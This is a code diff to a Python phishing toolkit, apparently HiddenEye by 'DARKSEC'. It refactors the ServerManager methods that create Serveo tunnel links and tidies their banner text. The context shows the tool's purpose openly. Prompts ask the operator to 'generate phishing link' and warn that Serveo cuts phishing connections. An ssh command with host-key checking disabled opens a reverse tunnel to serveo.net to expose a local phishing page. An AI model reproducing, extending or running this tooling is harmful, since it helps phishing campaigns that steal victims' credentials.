@@ -426,13 +426,13 @@ class ServerManager:
                 system('rm -Rf ' + filename)
                 system('clear')
 
-    def runServeo(self, port):
+    def runServeo(port):
         print('''
             {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
             |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
             |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
             {0}http://github.com/darksecdevelopers
-            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allow Phishing.\n{0}[{1}!{0}]{1}They Drop Their Connection Whenever Detect Phishing. '''.format(MAIN0, MAIN2))
+            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]\n-------------------------------\n[{1}!{0}]{1}REMEMBER ? Serveo Don't Allow Phishing.\n{0}[{1}!{0}]{1}They Drop Their Connection Whenever Detect Phishing. '''.format(MAIN0, MAIN2))
         print(
             "\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
         print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(
@@ -447,7 +447,7 @@ class ServerManager:
             system('clear')
             return ServerManager.runServeo(port)
 
-    def customServeo(self, port):
+    def customServeo(port):
 
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -485,14 +485,14 @@ class ServerManager:
             system('clear')
             return ServerManager.customServeo(port)  # FIXME
 
-    def randomServeo(self, port):
+    def randomServeo(port):
         system('clear')
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]\n-------------------------------'''.format(MAIN0, MAIN2))
         system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
         sleep(8)
         try:
